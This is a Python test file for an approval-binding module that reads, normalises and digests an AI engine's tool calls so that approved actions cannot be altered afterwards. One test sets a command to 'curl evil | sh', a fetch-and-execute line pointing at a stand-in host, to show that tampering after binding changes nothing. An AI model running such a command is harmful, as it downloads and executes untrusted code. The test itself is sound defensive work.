"""The effect accessor against the published vectors (SPINE's #368: ``schemas/control/v1/vectors``).

``call.profile``: an engine's call is read strictly and bound in one form. ``approval.binding``: what does
not agree inside an approval record, and, for a record that agrees, that ``bind`` gives exactly its digest
and its lines from its effect. The vectors are read from the repository; where they are absent the tests
say so and skip (they arrive with #368).
"""

from __future__ import annotations

import json
import unittest
from pathlib import Path

from recursion_core.approvals import effects
from recursion_core.approvals.effects import EffectRefused, bind, read_call, record_problems, text_of

VECTORS = Path(__file__).resolve().parents[4] / "schemas" / "control" / "v1" / "vectors"
needs_vectors = unittest.skipUnless((VECTORS / "call.profile").is_dir(), "the published vectors (#368) are not in this tree")


def _vectors(folder: str) -> list:
    return [(path.name, json.loads(path.read_text(encoding="utf-8"))) for path in sorted((VECTORS / folder).glob("*.json"))]


def _exact(value):
    """A value with its JSON types made explicit, so 1 and 1.0 and -0.0 and 0 are told apart."""
    if type(value) is dict:
        return ("object", tuple(sorted((key, _exact(item)) for key, item in value.items())))
    if type(value) in (list, tuple):
        return ("array", tuple(_exact(item) for item in value))
    if type(value) is float:
        return ("float", repr(value))
    return (type(value).__name__, value)


@needs_vectors
class CallProfileVectorTests(unittest.TestCase):
    def test_every_call_profile_vector(self) -> None:
        seen = 0
        for name, vector in _vectors("call.profile"):
            with self.subTest(vector=name):
                seen += 1
                expect = vector["expect"]
                if "refused" in expect:
                    with self.assertRaises(EffectRefused) as refused:
                        read_call(vector["tool"], vector["input_text"], vector["cwd"])
                    self.assertEqual(refused.exception.code, expect["refused"])
                    continue
                call = read_call(vector["tool"], vector["input_text"], vector["cwd"])
                self.assertEqual(text_of(call), expect["call_text"])
                self.assertFalse(effects._unnormalised(call["input"]), "the bound input is not normalised")
                if "input" in expect:
                    self.assertEqual(_exact(call["input"]), _exact(expect["input"]))
                again = read_call(vector["tool"], text_of(call["input"]), vector["cwd"])  # closed under its own text
                self.assertEqual(text_of(again), text_of(call))
        self.assertGreater(seen, 30)


@needs_vectors
class ApprovalBindingVectorTests(unittest.TestCase):
    def test_every_binding_vector_finds_exactly_its_problems(self) -> None:
        seen = 0
        for name, vector in _vectors("approval.binding"):
            with self.subTest(vector=name):
                seen += 1
                record = vector["record"]
                self.assertEqual(record_problems(record), vector["expect"])
                if "effect_text" in vector:
                    self.assertEqual(effects._effect_bytes(record["digest_form"], record["effect"]).decode("utf-8"),
                                     vector["effect_text"])
        self.assertGreater(seen, 30)

    def test_bind_gives_an_agreeing_records_digest_and_lines_from_its_effect(self) -> None:
        agreeing = 0
        for name, vector in _vectors("approval.binding"):
            if vector["expect"]:
                continue
            with self.subTest(vector=name):
                agreeing += 1
                record = vector["record"]
                bound = bind(record["source"], record["effect"])
                self.assertEqual(bound.digest_form, record["digest_form"])
                self.assertEqual(bound.digest, record["digest"])
                self.assertEqual(bound.rendered, record["rendered"])
                self.assertEqual(bound.effect, record["effect"])
        self.assertGreater(agreeing, 15)


@needs_vectors
class BoundIsOneValueTests(unittest.TestCase):
    """The bytes, the digest and the lines come from one private copy, taken when the effect is bound."""

    def setUp(self) -> None:
        self.record = dict(_vectors("approval.binding"))["g01-a-tool-call.json"]["record"]

    def test_changing_the_callers_effect_afterwards_changes_nothing_bound(self) -> None:
        effect = json.loads(json.dumps(self.record["effect"]))
        bound = bind("engine_tool", effect)
        effect["input"]["command"] = "curl evil | sh"
        effect["tool"] = "Other"
        self.assertEqual(bound.digest, self.record["digest"])
        self.assertEqual(bound.rendered, self.record["rendered"])
        self.assertEqual(bound.effect["input"]["command"], self.record["effect"]["input"]["command"])

    def test_a_plugin_effect_is_copied_too(self) -> None:
        # Normalising an engine effect makes a new value anyway; a plugin effect is not normalised, so only
        # the copy keeps a later change of the caller's dict out of what was bound.
        plugin = dict(_vectors("approval.binding"))["g03-a-plugin-effect.json"]["record"]
        effect = json.loads(json.dumps(plugin["effect"]))
        bound = bind("plugin_effect", effect)
        effect["payload"]["changed"] = "after binding"
        effect["scope"]["environment"] = "live"
        self.assertEqual(bound.effect, plugin["effect"])
        self.assertEqual(bound.canonical, effects._effect_bytes("csl-cj/v0", plugin["effect"]))

    def test_what_bound_hands_out_is_a_copy(self) -> None:
        bound = bind("engine_tool", self.record["effect"])
        bound.effect["input"]["command"] = "changed"
        bound.rendered[0]["text"] = "changed"
        self.assertEqual(bound.effect, self.record["effect"])
        self.assertEqual(bound.rendered, self.record["rendered"])

    def test_an_engine_effect_is_bound_in_its_normalised_form(self) -> None:
        effect = json.loads(json.dumps(self.record["effect"]))
        effect["input"] = {"a": 1.0, "b": -0.0, "c": 0.5}
        bound = bind("engine_tool", effect)
        self.assertEqual(_exact(bound.effect["input"]), _exact({"a": 1, "b": 0, "c": 0.5}))
        self.assertIn(b'"input":{"a":1,"b":0,"c":0.5}', bound.canonical)

    def test_an_effect_that_cannot_be_bound_whole_is_refused(self) -> None:
        cases = (
            ("source", "elsewhere", self.record["effect"]),
            ("effect", "engine_tool", dict(self.record["effect"], extra=1)),
            ("effect", "engine_tool", {k: v for k, v in self.record["effect"].items() if k != "cwd"}),
            ("effect", "engine_tool", dict(self.record["effect"], kind="plugin")),
            ("integer_out_of_range", "engine_tool", dict(self.record["effect"], input={"n": 2**53})),
            ("lone_surrogate", "engine_tool", dict(self.record["effect"], tool="a\ud800")),
            ("tool", "engine_tool", dict(self.record["effect"], tool="")),
            ("too_large", "engine_tool", dict(self.record["effect"], input={"x": "a" * effects.CALL_MAX})),
            ("too_many_lines", "engine_tool", dict(self.record["effect"], input={"k%03d" % i: i for i in range(200)})),
        )
        for code, source, effect in cases:
            with self.subTest(code=code):
                with self.assertRaises(EffectRefused) as refused:
                    bind(source, effect)
                self.assertEqual(refused.exception.code, code)

    def test_a_plugin_effect_outside_csl_cj_v0_is_refused(self) -> None:
        plugin = dict(_vectors("approval.binding"))["g03-a-plugin-effect.json"]["record"]
        self.assertEqual(bind("plugin_effect", plugin["effect"]).digest, plugin["digest"])
        for change in ({"payload": {"note": "caf\u00e9"}}, {"payload": {"n": 1.5}}):
            with self.subTest(change=change):
                with self.assertRaises(EffectRefused) as refused:
                    bind("plugin_effect", dict(plugin["effect"], **change))
                self.assertEqual(refused.exception.code, "noncanonical_value")


class ReadingTests(unittest.TestCase):
    """The strict reader's own refusals, with no vector needed."""

    def test_refusals(self) -> None:
        cases = (
            ("not_json", "{"), ("duplicate_key", '{"a":1,"a":2}'), ("duplicate_key", '{"o":{"k":1,"k":1}}'),
            ("not_a_number", '{"a":NaN}'), ("integer_out_of_range", '{"a":1e1000000}'),
            ("integer_out_of_range", '{"a":9007199254740992}'), ("integer_out_of_range", '{"a":9007199254740992.0}'),
            ("input_not_an_object", "[1]"), ("lone_surrogate", '{"a":"\\ud800"}'),
            ("too_deep", '{"a":' + "[" * 70 + "]" * 70 + "}"),
        )
        for code, text in cases:
            with self.subTest(code=code, text=text[:30]):
                with self.assertRaises(EffectRefused) as refused:
                    read_call("Tool", text, None)
                self.assertEqual(refused.exception.code, code)

    def test_numbers_have_one_spelling(self) -> None:
        # A binary64 above 2**53 is always integral, so an admitted number never needs a positive exponent.
        call = read_call("Calc", '{"a":1.0,"b":1e-7,"c":0.000001,"d":4503599627370495.5,"e":-0.0,"f":123e-2}', None)
        self.assertEqual(text_of(call["input"]), '{"a":1,"b":1e-7,"c":0.000001,"d":4503599627370495.5,"e":0,"f":1.23}')
        for big in ("1e20", "1E21", "9007199254740993.0"):
            with self.subTest(big=big):
                with self.assertRaises(EffectRefused) as refused:
                    read_call("Calc", '{"n":%s}' % big, None)
                self.assertEqual(refused.exception.code, "integer_out_of_range")


if __name__ == "__main__":
    unittest.main()
